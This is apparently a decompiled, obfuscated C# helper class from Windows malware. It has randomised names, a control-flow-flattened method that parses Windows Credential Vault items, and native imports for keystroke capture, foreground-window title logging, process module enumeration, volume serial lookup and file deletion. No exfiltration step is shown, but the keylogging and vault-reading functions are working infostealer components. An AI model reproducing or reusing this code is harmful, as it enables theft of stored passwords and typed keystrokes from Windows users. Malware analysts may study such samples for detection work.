using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace ppkr;

public static class gVe3wBP
{
	public struct ZUm
	{
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	public enum OQMoH
	{
		Undefined = -1,
		Boolean,
		Short,
		UnsignedShort,
		Int,
		UnsignedInt,
		Double,
		Guid,
		String,
		ByteArray,
		TimeStamp,
		ProtectedArray,
		Attribute,
		Sid,
		Last
	}

	public enum l18KPm20tQQ
	{
		Illegal = 0,
		Resource = 1,
		Identity = 2,
		Authenticator = 3,
		Tag = 4,
		PackageSid = 5,
		AppStart = 100,
		AppEnd = 10000
	}

	public struct PH5
	{
		public int Length;

		public IntPtr pData;
	}

	public struct _06ZbC
	{
		public Guid SchemaId;

		public IntPtr pszCredentialFriendlyName;

		public IntPtr pResourceElement;

		public IntPtr pIdentityElement;

		public IntPtr pAuthenticatorElement;

		public IntPtr pPackageSid;

		public ulong LastModified;

		public uint dwFlags;

		public uint dwPropertiesCount;

		public IntPtr pPropertyElements;
	}

	public struct EFrFq
	{
		public Guid SchemaId;

		public IntPtr pszCredentialFriendlyName;

		public IntPtr pResourceElement;

		public IntPtr pIdentityElement;

		public IntPtr pAuthenticatorElement;

		public ulong LastModified;

		public uint dwFlags;

		public uint dwPropertiesCount;

		public IntPtr pPropertyElements;
	}

	[StructLayout(LayoutKind.Explicit)]
	public struct Ov0jSq
	{
		[FieldOffset(0)]
		public l18KPm20tQQ SchemaElementId;

		[FieldOffset(8)]
		public OQMoH Type;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll")]
	public static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("psapi.dll")]
	public static extern bool EnumProcessModules(IntPtr hProcess, [In][Out][MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] uint[] lphModule, uint cb, [MarshalAs(UnmanagedType.U4)] ref uint lpcbNeeded);

	[DllImport("psapi.dll")]
	public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, [In][MarshalAs(UnmanagedType.U4)] int nSize);

	[DllImport("user32.dll")]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32")]
	public static extern IntPtr GetKeyboardLayout(int dwLayout);

	[DllImport("user32")]
	public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpChar, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("kernel32")]
	public static extern int GetPrivateProfileString(string lpAppName, string lpKeyName, string lpDefault, StringBuilder lpReturnedString, int nSize, string lpFileName);

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool DeleteFile(string name);

	[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumeInformation(string rootPathName, StringBuilder volumeNameBuffer, int volumeNameSize, out uint volumeSerialNumber, out uint maximumComponentLength, out uint fileSystemFlags, StringBuilder fileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("kernel32")]
	public static extern int GetModuleFileName(int hModule, string lpFileName, int nSize);

	[DllImport("kernel32")]
	public static extern int MoveFile([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	[DllImport("vaultcli.dll")]
	public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

	[DllImport("vaultcli.dll")]
	public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

	[DllImport("vaultcli.dll")]
	public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

	[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
	public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

	public static object LcWKH6Lg(IntPtr bXGeD)
	{
		int num = 0;
		object obj = default;
		IntPtr ptr = default;
		IntPtr ptr2 = default;
		int num2 = default;
		object value = default;
		SecurityIdentifier securityIdentifier = default;
		FieldInfo field = default;
		object obj2 = default;
		PH5 pH = default;
		IntPtr binaryForm = default;
		byte[] array = default;
		while (true)
		{
			if (num == 26)
			{
				goto IL_001f;
			}
			goto IL_0044;
			IL_0044:
			if (num == 12)
			{
				obj = (bool)obj;
				num = 13;
			}
			if (num == 23)
			{
				break;
			}
			if (num == 9)
			{
				obj = Marshal.PtrToStringUni(ptr);
				num = 10;
			}
			if (num == 31)
			{
				goto IL_00c7;
			}
			goto IL_00dd;
			IL_035f:
			num = 7;
			goto IL_0368;
			IL_00ee:
			obj = null;
			num = 36;
			goto IL_00fc;
			IL_027f:
			obj = Marshal.ReadInt16(ptr2);
			num = 15;
			goto IL_029a;
			IL_0203:
			obj = Marshal.ReadByte(ptr2);
			num = 12;
			goto IL_021e;
			IL_022f:
			obj = Marshal.PtrToStructure(ptr2, typeof(Guid));
			num = 25;
			goto IL_024f;
			IL_00dd:
			if (num == 35)
			{
				goto IL_00ee;
			}
			goto IL_00fc;
			IL_00fc:
			if (num == 5)
			{
				num2 = Convert.ToInt32(value);
				num = 6;
			}
			if (num == 18)
			{
				goto IL_0134;
			}
			goto IL_014f;
			IL_018c:
			ptr = Marshal.ReadIntPtr(ptr2);
			num = 9;
			goto IL_01a2;
			IL_01b3:
			obj = Marshal.PtrToStructure(ptr2, typeof(double));
			num = 23;
			goto IL_01d3;
			IL_014f:
			if (num == 20)
			{
				goto IL_0160;
			}
			goto IL_017b;
			IL_017b:
			if (num == 8)
			{
				goto IL_018c;
			}
			goto IL_01a2;
			IL_01a2:
			if (num == 22)
			{
				goto IL_01b3;
			}
			goto IL_01d3;
			IL_01d3:
			if (num == 21)
			{
				break;
			}
			if (num == 11)
			{
				goto IL_0203;
			}
			goto IL_021e;
			IL_0160:
			obj = Marshal.ReadInt32(ptr2);
			num = 21;
			goto IL_017b;
			IL_021e:
			if (num == 24)
			{
				goto IL_022f;
			}
			goto IL_024f;
			IL_024f:
			if (num == 19)
			{
				break;
			}
			if (num == 14)
			{
				goto IL_027f;
			}
			goto IL_029a;
			IL_0134:
			obj = Marshal.ReadInt32(ptr2);
			num = 19;
			goto IL_014f;
			IL_029a:
			if (num == 33)
			{
				obj = securityIdentifier.Value;
				num = 34;
			}
			if (num == 2)
			{
				field = obj2.GetType().GetField("Type");
				num = 3;
			}
			if (num == 34)
			{
				break;
			}
			if (num == 6)
			{
				switch (num2)
				{
				case 8:
					break;
				case 12:
					goto IL_00c7;
				case 9:
				case 10:
				case 11:
					goto IL_00ee;
				case 3:
					goto IL_0134;
				case 4:
					goto IL_0160;
				case 7:
					goto IL_018c;
				case 5:
					goto IL_01b3;
				case 0:
					goto IL_0203;
				case 6:
					goto IL_022f;
				case 1:
					goto IL_027f;
				default:
					goto IL_035f;
				case 2:
					goto IL_0379;
				}
				goto IL_001f;
			}
			goto IL_0368;
			IL_001f:
			pH = (PH5)Marshal.PtrToStructure(ptr2, typeof(PH5));
			num = 27;
			goto IL_0044;
			IL_00c7:
			binaryForm = Marshal.ReadIntPtr(ptr2);
			num = 32;
			goto IL_00dd;
			IL_0379:
			obj = Marshal.ReadInt16(ptr2);
			num = 17;
			goto IL_0394;
			IL_0368:
			if (num == 16)
			{
				goto IL_0379;
			}
			goto IL_0394;
			IL_0394:
			if (num == 25)
			{
				break;
			}
			if (num == 28)
			{
				Marshal.Copy(pH.pData, array, 0, pH.Length);
				num = 29;
			}
			if (num == 4)
			{
				ptr2 = (IntPtr)(bXGeD.ToInt64() + 16);
				num = 5;
			}
			if (num == 1)
			{
				obj2 = Marshal.PtrToStructure(bXGeD, typeof(Ov0jSq));
				num = 2;
			}
			if (num == 13 || num == 15)
			{
				break;
			}
			if (num == 29)
			{
				string text = Encoding.UTF8.GetString(array);
				char[] trimChars = new char[1];
				obj = text.Trim(trimChars);
				num = 30;
			}
			if (num == 10)
			{
				break;
			}
			if (num == 7)
			{
				goto IL_00ee;
			}
			if (num == 32)
			{
				securityIdentifier = new SecurityIdentifier(binaryForm);
				num = 33;
			}
			if (num == 30 || num == 17)
			{
				break;
			}
			if (num == 27)
			{
				array = new byte[pH.Length - 1 + 1];
				num = 28;
			}
			if (num == 3)
			{
				value = field.GetValue(obj2);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 36)
			{
				break;
			}
		}
		return obj;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);
}
